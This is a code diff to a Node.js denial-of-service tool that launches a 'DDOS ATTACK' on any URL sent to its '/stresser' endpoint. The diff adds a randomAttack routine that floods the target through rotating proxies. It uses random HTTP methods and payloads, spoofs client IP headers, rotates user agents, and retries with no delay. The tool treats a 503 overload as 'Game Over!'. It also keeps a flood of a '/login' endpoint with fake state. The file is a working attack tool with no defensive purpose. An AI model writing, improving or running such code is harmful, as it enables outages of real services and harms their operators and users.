@@ -52,7 +52,7 @@ const langHeaders = [
     "en-US,en;q=0.5",
     "en-US,en;q=0.9",
     "de-CH;q=0.7",
-    "da, en -gb;q=0.8, en;q=0.7",
+    "da, en-gb;q=0.8, en;q=0.7",
     "cs;q=0.5",
     "en-US,en;q=0.9",
     "en-GB,en;q=0.9",
@@ -120,6 +120,129 @@ const loadProxies = () => {
     }
 };
 
+// Random payload generator
+const generateRandomPayload = () => {
+    const payloadTypes = ['json', 'form', 'text'];
+    const type = getRandomElement(payloadTypes);
+
+    switch (type) {
+        case 'json':
+            return {
+                data: {
+                    id: Math.floor(Math.random() * 100000),
+                    value: Math.random().toString(36).substring(2, 15),
+                    timestamp: Date.now(),
+                    nested: { key: Math.random() }
+                },
+                contentType: 'application/json'
+            };
+        case 'form':
+            return {
+                data: {
+                    username: Math.random().toString(36).substring(7),
+                    password: Math.random().toString(36).substring(7),
+                    token: Math.random().toString(36).substring(7)
+                },
+                contentType: 'application/x-www-form-urlencoded'
+            };
+        case 'text':
+            return {
+                data: Math.random().toString(36).repeat(Math.floor(Math.random() * 100)),
+                contentType: 'text/plain'
+            };
+        default:
+            return { data: {}, contentType: 'application/json' };
+    }
+};
+
+// Available HTTP methods for random attack
+const httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
+
+// Random attack function
+const randomAttack = (url, agent, continueAttack) => {
+    if (!continueAttack) return;
+
+    const method = getRandomElement(httpMethods);
+    const { data: payload, contentType } = generateRandomPayload();
+
+    const headersForRequest = {
+        "Content-Type": contentType,
+        "User-Agent": sanitizeUA(getRandomElement(userAgents())),
+        "Accept": getRandomElement(acceptHeaders),
+        "Accept-Language": getRandomElement(langHeaders),
+        "Cache-Control": getRandomElement(cipherSuites),
+        "Referer": getRandomElement(referrers),
+        "Connection": "keep-alive",
+        "DNT": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "TE": "Trailers",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Pragma": getRandomElement(cipherSuites),
+        "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
+        "Via": `1.1 ${Math.random().toString(36).substring(7)}`,
+        "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
+        "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+        "Host": url.replace(/https?:\/\//, "").split("/")[0],
+        "sec-fetch-site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Origin": url.split("/").slice(0, 3).join("/"),
+        "X-XSS-Protection": "1; mode=block",
+        "X-Frame-Options": "DENY",
+        "X-Content-Type-Options": "nosniff",
+        "If-None-Match": '"W/"5c-1f7b"',
+        "X-Requested-With": "XMLHttpRequest",
+        "Content-Security-Policy": "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; object-src 'none';",
+        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+        "Feature-Policy": "geolocation 'none'; microphone 'none'; camera 'none';",
+        "Accept-Charset": "utf-8",
+        "Expires": "0",
+        "X-Content-Security-Policy": "default-src 'self';",
+        "X-Download-Options": "noopen",
+        "X-DNS-Prefetch-Control": "off",
+        "X-Permitted-Cross-Domain-Policies": "none",
+        "X-Powered-By": "PHP/7.4.3",
+    };
+
+    const config = {
+        httpAgent: agent,
+        headers: headersForRequest,
+        timeout: 0,
+        method: method,
+        url: url,
+        data: method !== 'GET' && method !== 'HEAD' ? payload : undefined
+    };
+
+    axios(config)
+        .then(() => {
+            setTimeout(() => randomAttack(url, agent, continueAttack), 0);
+        })
+        .catch((err) => {
+            if (
+                err.code === "ECONNRESET" ||
+                err.code === "ECONNREFUSED" ||
+                err.code === "EHOSTUNREACH" ||
+                err.code === "ETIMEDOUT" ||
+                err.code === "EAI_AGAIN" ||
+                err.message === "Socket is closed"
+            ) {
+                // console.log(rainbow("Unable to Attack Target Server Refused!"));
+            } else if (err.response?.status === 404) {
+                // console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
+            } else if (err.response?.status === 503) {
+                console.log(rainbow("Target under heavy load (503) - Game Over!"));
+            } else if (err.response?.status === 502) {
+                console.log(rainbow("Bad Gateway (502)."));
+            } else if (err.response?.status === 403) {
+                // console.log(rainbow("Forbidden (403)."));
+            } else if (err.response?.status) {
+                // console.log(rainbow(`DDOS Status: (${err.response?.status})`));
+            } else {
+                // console.log(rainbow(err.message || "ATTACK FAILED!"));
+            }
+            setTimeout(() => randomAttack(url, agent, continueAttack), 0);
+        });
+};
+
 const performAttack = (url, agent, continueAttack) => {
     if (!continueAttack) return;
 
@@ -160,66 +283,50 @@ const performAttack = (url, agent, continueAttack) => {
         "X-Permitted-Cross-Domain-Policies": "none",
         "X-Powered-By": "PHP/7.4.3",
     };
-    
-    axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/create", {
-  appstate: fakeState(),
-  botname: ['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)],
-  botadmin: Array.from({ length: 14 }, () => Math.floor(Math.random() * 10)).join(''),
-  botprefix: '!@#$%^&*()_+{}|:"<>?`~[];\',./'[Math.floor(Math.random() * 28)],
-  username: `${['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)]}${Array.from({ length: 4 }, () => Math.random().toString(36).charAt(2)).join('')}${Array.from({ length: 2 }, () => Math.floor(Math.random() * 10)).join('')}`
-})
-    .then(() => {
-        setTimeout(() => performAttack(url, agent, continueAttack), 0);
-    })
-    .catch((err) => {
-        setTimeout(() => performAttack(url, agent, continueAttack), 0);
-    });
-
 
     axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
         state: fakeState()
     })
-    .then(() => {
-        setTimeout(() => performAttack(url, agent, continueAttack), 0);
-    })
-    .catch((err) => {
-        setTimeout(() => performAttack(url, agent, continueAttack), 0);
-    });
-
-    axios.get(url,
-        {
-            httpAgent: agent,
-            headers: headersForRequest,
-            timeout: 0,
+        .then(() => {
+            setTimeout(() => performAttack(url, agent, continueAttack), 0);
         })
-    .then(() => {
-        setTimeout(() => performAttack(url, agent, continueAttack), 0);
+        .catch((err) => {
+            setTimeout(() => performAttack(url, agent, continueAttack), 0);
+        });
+
+    axios.get(url, {
+        httpAgent: agent,
+        headers: headersForRequest,
+        timeout: 0,
     })
-    .catch((err) => {
-        if (
-            err.code === "ECONNRESET" ||
-            err.code === "ECONNREFUSED" ||
-            err.code === "EHOSTUNREACH" ||
-            err.code === "ETIMEDOUT" ||
-            err.code === "EAI_AGAIN" ||
-            err.message === "Socket is closed"
-        ) {
-           // console.log(rainbow("Unable to Attack Target Server Refused!"));
-        } else if (err.response?.status === 404) {
-        //    console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
-        } else if (err.response?.status === 503) {
-            console.log(rainbow("Target under heavy load (503) - Game Over!"));
-        } else if (err.response?.status === 502) {
-            console.log(rainbow("Bad Gateway (502)."));
-        } else if (err.response?.status === 403) {
-          //  console.log(rainbow("Forbidden (403)."));
-        } else if (err.response?.status) {
-         //   console.log(rainbow(`DDOS Status: (${err.response?.status})`));
-        } else {
-          //  console.log(rainbow(err.message || "ATTACK FAILED!"));
-        }
-        setTimeout(() => performAttack(url, agent, continueAttack), 0);
-    });
+        .then(() => {
+            setTimeout(() => performAttack(url, agent, continueAttack), 0);
+        })
+        .catch((err) => {
+            if (
+                err.code === "ECONNRESET" ||
+                err.code === "ECONNREFUSED" ||
+                err.code === "EHOSTUNREACH" ||
+                err.code === "ETIMEDOUT" ||
+                err.code === "EAI_AGAIN" ||
+                err.message === "Socket is closed"
+            ) {
+                // console.log(rainbow("Unable to Attack Target Server Refused!"));
+            } else if (err.response?.status === 404) {
+                // console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
+            } else if (err.response?.status === 503) {
+                console.log(rainbow("Target under heavy load (503) - Game Over!"));
+            } else if (err.response?.status === 502) {
+                console.log(rainbow("Bad Gateway (502)."));
+            } else if (err.response?.status === 403) {
+                // console.log(rainbow("Forbidden (403)."));
+            } else if (err.response?.status) {
+                // console.log(rainbow(`DDOS Status: (${err.response?.status})`));
+            } else {
+                // console.log(rainbow(err.message || "ATTACK FAILED!"));
+            }
+            setTimeout(() => performAttack(url, agent, continueAttack), 0);
+        });
 };
 
 const updateState = () => {
@@ -258,7 +365,9 @@ const startAttack = (url, durationHours) => {
         const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
         const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
 
+        // Start both original and random attacks
         performAttack(url, agent, continueAttack);
+        randomAttack(url, agent, continueAttack);
     }
 };
 
@@ -273,7 +382,7 @@ app.get("/stresser", (req, res) => {
     }
     targetUrl = url;
     startAttack(targetUrl, durationHours);
-    res.json({ message: "Starting DDOS ATTACK..." });
+    res.json({ message: "Starting DDOS ATTACK with random payloads..." });
 });
 
 const port = process.env.PORT || 25694 || Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
@@ -287,4 +396,3 @@ app.listen(port, () => {
         }
     }
 });
-
